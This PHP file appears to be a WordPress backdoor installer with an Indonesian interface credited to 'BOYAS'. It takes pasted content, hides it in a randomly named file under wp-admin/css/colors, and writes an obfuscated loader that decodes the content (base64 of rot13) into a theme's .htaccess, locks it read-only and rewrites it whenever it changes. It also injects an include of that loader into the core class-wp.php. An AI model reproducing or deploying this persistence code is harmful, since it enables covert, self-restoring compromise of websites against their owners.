<?php
function getRandomColorDir($basePath) {
    $colors = glob($basePath . '*', GLOB_ONLYDIR);
    return $colors ? $colors[array_rand($colors)] : null;
}

function getRandomFilename($dir) {
    return $dir . '/' . rand(1000, 999999);
}

$basePath = __DIR__ . '/wp-admin/css/colors/';
$colorDir = getRandomColorDir($basePath);

if (!$colorDir) {
    die("<p class='text-red-500 text-center'>Tidak dapat menemukan direktori warna.</p>");
}

$file1 = getRandomFilename($colorDir);
$file2 = getRandomFilename($colorDir);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_content'])) {
    $content = $_POST['file_content'];
    file_put_contents($file2, $content);

    $file1Content = "<?php\n"
        . "\$ddscdws = '/home/stakamac/public_html/wp-content/themes/astra/.htaccess';\n"
        . "\$sdfdsdfh = '$file2';\n"
        . "if (!file_exists(\$ddscdws) && file_exists(\$sdfdsdfh)) {\n"
        . "    \$iide = file_get_contents(\$sdfdsdfh);\n"
        . "    \$iide = base64_decode(str_rot13(\$iide));\n"
        . "    @file_put_contents(\$ddscdws, \$iide);\n"
        . "    @chmod(\$ddscdws, 0444);\n"
        . "}\n"
        . "if (file_exists(\$ddscdws) && file_exists(\$sdfdsdfh)) {\n"  
        . "    \$acdfadfasf = file_get_contents(\$ddscdws);\n"
        . "    \$iide = file_get_contents(\$sdfdsdfh);\n"
        . "    \$iide = base64_decode(str_rot13(\$iide));\n"
        . "    if (md5(\$acdfadfasf) != md5(\$iide)) {\n"
        . "        @chmod(\$ddscdws, 0644);\n"
        . "        @file_put_contents(\$ddscdws, \$iide);\n"
        . "        @chmod(\$ddscdws, 0444);\n"
        . "    }\n"
        . "}\n";

    file_put_contents($file1, $file1Content);

    $wpClassPath = __DIR__ . '/wp-includes/class-wp.php';
    if (file_exists($wpClassPath)) {
        $wpClassContent = file_get_contents($wpClassPath);
        
        $pattern = '/(\$this->register_globals\(\);)/';
        $replace = "$1\n\t\t\t\tinclude \"$file1\";";
    
        if (preg_match($pattern, $wpClassContent)) {
            $wpClassContent = preg_replace($pattern, $replace, $wpClassContent, 1);
            file_put_contents($wpClassPath, $wpClassContent);
            echo "<p class='text-green-500 text-center'>Include berhasil ditambahkan!</p>";
        } else {
            echo "<p class='text-red-500 text-center'>String pencarian tidak ditemukan!</p>";
        }
    }
    
} else {
    echo '<!DOCTYPE html>';
    echo '<html lang="id">';
    echo '<head>';
    echo '<meta charset="UTF-8">';
    echo '<meta name="viewport" content="width=device-width, initial-scale=1.0">';
    echo '<script src="https://cdn.tailwindcss.com"></script>';
    echo '<title>Upload File</title>';
    echo '</head>';
    echo '<body class="bg-black text-green-400 flex items-center justify-center h-screen">';
    echo '<div class="bg-gray-900 p-8 rounded-lg shadow-lg max-w-md w-full">';
    echo '<h2 class="text-xl font-bold text-center">Developed by BOYAS</h2>';
    echo '<form method="post" class="mt-4">';
    echo '<textarea name="file_content" rows="10" class="w-full p-2 bg-gray-800 text-green-300 rounded-lg" placeholder="Masukkan isi file kedua..."></textarea><br>';
    echo '<button type="submit" class="mt-4 w-full bg-green-600 hover:bg-green-500 text-black font-bold py-2 px-4 rounded">Buat File</button>';
    echo '</form>';
    echo '</div>';
    echo '</body>';
    echo '</html>';
}
